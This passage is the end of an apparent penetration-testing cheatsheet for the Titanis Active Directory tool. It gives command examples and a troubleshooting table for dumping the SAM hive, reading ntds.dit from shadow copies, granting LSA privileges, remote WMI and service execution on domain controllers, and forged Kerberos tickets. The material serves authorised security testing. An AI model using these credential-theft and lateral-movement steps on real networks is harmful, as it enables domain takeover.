# Decode a security descriptor (binary or SDDL)
Sddl describe "O:BAG:SYD:PAI(A;CI;KA;;;BA)(A;CI;KR;;;AU)" 
Sddl describe "010004805800000068000000000000001400000002..."  # binary, hex

# AD rights GUID lookup
Sddl lookupguid "5f202010-79a5-11d0-9020-00c04fc2d4cf"     

# User-Force-Change-Password

# Well-known SID abbreviations
Sddl lookupwks DA, "S-1-18-1"

# List dynamic RPC endpoints on a target (port mapper)
Epm lsep $TARGET -u $UPN -p $PASS -Kdc $DC_IP
```

## Common Pitfalls & Potential Errors

| Issues Encountered                                                             | Cause                                                                                      | Fix                                                                                              |
| ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------ |
| `STATUS_ACCESS_DENIED` on `Reg dumpsam` as DA                                  | Backup-semantics flag missing                                                              | Add `-BackupSemantics` (Reg) or `-UseBackupSemantics` (Smb2Client)                               |
| LDAP query returns INFO referral, no rows                                      | On Linux, its default config doesn't follow referrals                                      | Add `-FollowReferrals`                                                                           |
| `Lsa addpriv` fails with `STATUS_OBJECT_NAME_NOT_FOUND`                        | `-ByName` lookups are buggy when tested against a fully patched DC Server 2022             | Use `-BySid` after `Lsa lookupname`                                                              |
| `Lsa addpriv`: account has no entry                                            | LSA needs explicit policy object first                                                     | `Lsa createaccount <SID>` first                                                                  |
| LSA priv ops fail against DC                                                   | Hardened DCs reject TCP RPC that's not signed/encrypted                                    | Add `-PreferSmb`                                                                                 |
| `Wmi exec` with Kerberos against FQDN fails                                    | Server expects short hostname in WMI activation                                            | Target = short name, use `-HostAddress` (`-ha`) for the actual IP                                |
| `Wmi exec` command containing `>` fails with `ERROR_FILE_NOT_FOUND`            | Titanis parses `>` specially                                                               | Wrap the command in a `.bat` file and exec the bat                                               |
| `-Tgt jdoe.ccache` doesn't authenticate                                        | Impacket built ticket ccache uses NT_PRINCIPAL whereas Titanis expects NT_SERVICE_INSTANCE | Generate ccache via `Kerb asreq -TicketCache`, or use `KRB5CCNAME` + impacket for forged tickets |
| `Smb2Client get @GMT-...\NTDS\ntds.dit` returns `STATUS_OBJECT_PATH_NOT_FOUND` | Path-component navigation breaks @GMT redirect                                             | Use impacket `smbclient.py` or Samba `smbclient` for VSS snapshot reads                          |
| `Sam aliasmembers` returns garbage / fails                                     | Some hosts require encryption                                                              | Add `-EncryptRpc`                                                                                |
| `Reg list` can't read default (unnamed) value                                  | Known limitation                                                                           | Use impacket `reg.py` or `wmiexec` `reg query /ve` for default values                            |
| `STATUS_OBJECT_NAME_NOT_FOUND` on `Scm create` against a DC                    | DC svcctl pipe appears to be in some way stricter than member servers                      | Use Titanis (it works); avoid impacket `smbexec.py` here                                         |

## Further Reading/References

- **Project home:** [trustedsec/Titanis](https://github.com/trustedsec/Titanis)
- **Official user guide:** [doc/UserGuide](https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/index.md)
- **Going from impacket → Titanis :** [n00py/Outpacket](https://github.com/n00py/Outpacket) — invaluable side-by-side reference
- **Titanis Changelog for feature updates:** [CHANGELOG.md](https://github.com/trustedsec/Titanis/blob/public/CHANGELOG.md)

## Conclusion

I had a great time building this cheatsheet out! A lot of things I learned along the way about Windows and well Titanis! Its a really nice, sleak tool that has a assertive but loveable synthax/thought process. It also has a great developer, as Alex was a huge help in developing this cheatsheet with me as well as giving me advice on how to make the most of Titanis.
